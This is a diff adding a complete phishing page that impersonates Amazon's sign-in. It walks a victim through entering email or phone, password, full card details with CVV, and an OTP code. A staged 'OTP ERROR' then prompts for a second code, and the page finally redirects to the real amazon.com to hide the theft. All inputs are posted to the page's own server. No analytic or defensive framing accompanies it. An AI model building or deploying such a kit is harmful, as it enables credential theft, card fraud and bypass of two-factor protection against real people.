@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
+    <title>Amazon Sign In</title>
+    <link rel="icon" href="https://www.amazon.com/favicon.ico">
+    <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+    <header class="header">
+        <a href="#" class="logo">
+            <img src="https://1000logos.net/wp-content/uploads/2016/10/Amazon-Logo.png" alt="Amazon">
+        </a>
+    </header>
+
+    <div class="container" id="container"></div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Help</a>
+        </div>
+        <div>© 1996-2025, Amazon.com, Inc. or its affiliates</div>
+    </footer>
+
+    <script src="/scripts.js"></script>
+    <script>
+        async function loadStep() {
+            const step = new URLSearchParams(window.location.search).get('step') || 'email';
+            const response = await fetch('/session-data');
+            const sessionData = await response.json();
+            const error = sessionData.error || '';
+            const userInput = sessionData.user_input || '';
+
+            const container = document.getElementById('container');
+            container.className = `container ${step === 'verify_card' ? 'wide-container' : ''}`;
+
+            if (step === 'email') {
+                container.innerHTML = `
+                    <h1 class="form-title">Sign in or create account</h1>
+                    ${error ? `<div class="error-message">${error}</div>` : ''}
+                    <form method="POST" action="/submit?step=email">
+                        <div class="form-group">
+                            <label for="email_or_phone" class="form-label">Enter mobile number or email</label>
+                            <input type="text" id="email_or_phone" name="email_or_phone" class="form-input" required>
+                        </div>
+                        <button type="submit" class="continue-btn">Continue</button>
+                    </form>
+                    <div class="terms-text">
+                        By continuing, you agree to Amazon's 
+                        <a href="#" class="terms-link">Conditions of Use</a> 
+                        and 
+                        <a href="#" class="terms-link">Privacy Notice</a>.
+                    </div>
+                    <div class="help-section">
+                        <a href="#" class="help-link">Need help?</a>
+                    </div>
+                    <div class="divider">
+                        <span class="divider-text">New to Amazon?</span>
+                    </div>
+                    <div class="business-section">
+                        <div class="business-title">Buying for work?</div>
+                        <a href="#" class="business-link">Create a free business account</a>
+                    </div>
+                `;
+            } else if (step === 'password') {
+                container.innerHTML = `
+                    <h1 class="form-title">Sign in</h1>
+                    <div class="user-info">
+                        <span class="user-email">${userInput}</span>
+                        <a href="/?step=email" class="change-link">Change</a>
+                    </div>
+                    ${error ? `<div class="error-message">${error}</div>` : ''}
+                    <form method="POST" action="/submit?step=password">
+                        <div class="form-group">
+                            <label for="password" class="form-label">Password</label>
+                            <input type="password" id="password" name="password" class="form-input" required>
+                        </div>
+                        <button type="submit" class="continue-btn">Sign in</button>
+                    </form>
+                    <div class="help-section">
+                        <a href="#" class="help-link">Forgot your password?</a>
+                    </div>
+                `;
+            } else if (step === 'verify_card') {
+                container.innerHTML = `
+                    <h1 class="form-title">Verify your account.</h1>
+                    ${error ? `<div class="error-message">${error}</div>` : ''}
+                    <form method="POST" action="/submit?step=verify_card">
+                        <div class="form-group">
+                            <label for="cardholder_name" class="form-label">Cardholder name</label>
+                            <input type="text" id="cardholder_name" name="cardholder_name" class="form-input" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="card_number" class="form-label">Card number</label>
+                            <input type="text" id="card_number" name="card_number" class="form-input card-number-input" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                        </div>
+                        <div class="input-row">
+                            <div class="input-col">
+                                <div class="form-group">
+                                    <label for="expiration_date" class="form-label">Expiration date</label>
+                                    <input type="text" id="expiration_date" name="expiration_date" class="form-input" placeholder="MM/YY" maxlength="5" required>
+                                </div>
+                            </div>
+                            <div class="input-col-small">
+                                <div class="form-group">
+                                    <label for="security_code" class="form-label">Security code</label>
+                                    <input type="text" id="security_code" name="security_code" class="form-input" placeholder="CVV" maxlength="4" required>
+                                </div>
+                            </div>
+                        </div>
+                        <button type="submit" class="continue-btn">Continue</button>
+                    </form>
+                `;
+            } else if (step === 'loading1') {
+                container.innerHTML = `
+                    <div class="loading-container">
+                        <div class="spinner"></div>
+                        <div class="loading-text">Processing your information...</div>
+                        <div class="countdown" id="countdown">10</div>
+                    </div>
+                `;
+                let timeLeft = 10;
+                const countdownElement = document.getElementById('countdown');
+                const timer = setInterval(() => {
+                    timeLeft--;
+                    countdownElement.textContent = timeLeft;
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        window.location.href = '/?step=otp';
+                    }
+                }, 1000);
+            } else if (step === 'otp') {
+                container.innerHTML = `
+                    <div class="otp-container">
+                        <h1 class="form-title">Verification Required</h1>
+                        <div class="otp-description">Please enter the verification code sent to your phone</div>
+                        ${error ? `<div class="error-message">${error}</div>` : ''}
+                        <form method="POST" action="/submit?step=otp">
+                            <div class="form-group">
+                                <input type="text" id="otp" name="otp" class="otp-input" placeholder="Enter 4-8 digit code" pattern="[0-9]{4,8}" maxlength="8" required>
+                            </div>
+                            <button type="submit" class="continue-btn">Verify</button>
+                        </form>
+                        <div class="help-section">
+                            <a href="#" class="help-link">Didn't receive the code?</a>
+                        </div>
+                    </div>
+                `;
+            } else if (step === 'loading2') {
+                container.innerHTML = `
+                    <div class="loading-container">
+                        <div class="spinner"></div>
+                        <div class="loading-text">Verifying your code...</div>
+                        <div class="countdown" id="countdown2">10</div>
+                    </div>
+                `;
+                let timeLeft2 = 10;
+                const countdownElement2 = document.getElementById('countdown2');
+                const timer2 = setInterval(() => {
+                    timeLeft2--;
+                    countdownElement2.textContent = timeLeft2;
+                    if (timeLeft2 <= 0) {
+                        clearInterval(timer2);
+                        window.location.href = '/?step=otp_error';
+                    }
+                }, 1000);
+            } else if (step === 'otp_error') {
+                container.innerHTML = `
+                    <div class="error-container">
+                        <div class="error-icon">⚠️</div>
+                        <h1 class="error-title">OTP ERROR</h1>
+                        <div class="error-description">
+                            The verification code you entered is incorrect.<br>
+                            Please enter the new code that was sent to your device.
+                        </div>
+                        <a href="/?step=otp2" class="retry-btn">Try Again</a>
+                    </div>
+                `;
+            } else if (step === 'otp2') {
+                container.innerHTML = `
+                    <div class="otp-container">
+                        <h1 class="form-title">Verification Required</h1>
+                        <div class="otp-description">Please enter the NEW verification code sent to your phone</div>
+                        ${error ? `<div class="error-message">${error}</div>` : ''}
+                        <form method="POST" action="/submit?step=otp2">
+                            <div class="form-group">
+                                <input type="text" id="otp2" name="otp2" class="otp-input" placeholder="Enter new 4-8 digit code" pattern="[0-9]{4,8}" maxlength="8" required>
+                            </div>
+                            <button type="submit" class="continue-btn">Verify</button>
+                        </form>
+                        <div class="help-section">
+                            <a href="#" class="help-link">Didn't receive the code?</a>
+                        </div>
+                    </div>
+                `;
+            } else if (step === 'final_loading') {
+                container.innerHTML = `
+                    <div class="loading-container">
+                        <div class="spinner"></div>
+                        <div class="loading-text">Verifying your account...</div>
+                        <div class="countdown" id="countdown3">5</div>
+                    </div>
+                `;
+                let timeLeft3 = 5;
+                const countdownElement3 = document.getElementById('countdown3');
+                const timer3 = setInterval(() => {
+                    timeLeft3--;
+                    countdownElement3.textContent = timeLeft3;
+                    if (timeLeft3 <= 0) {
+                        clearInterval(timer3);
+                        window.location.href = '/?step=success';
+                    }
+                }, 1000);
+            } else if (step === 'success') {
+                container.innerHTML = `
+                    <div class="success-container">
+                        <div class="success-icon">✅</div>
+                        <h1 class="success-title">Account Verified</h1>
+                        <div class="success-description">
+                            Your account has been successfully verified.<br>
+                            You will be redirected to Amazon in a moment.
+                        </div>
+                    </div>
+                `;
+                setTimeout(() => {
+                    window.location.href = 'https://www.amazon.com';
+                }, 3000);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', loadStep);
+    </script>
+</body>
+</html>
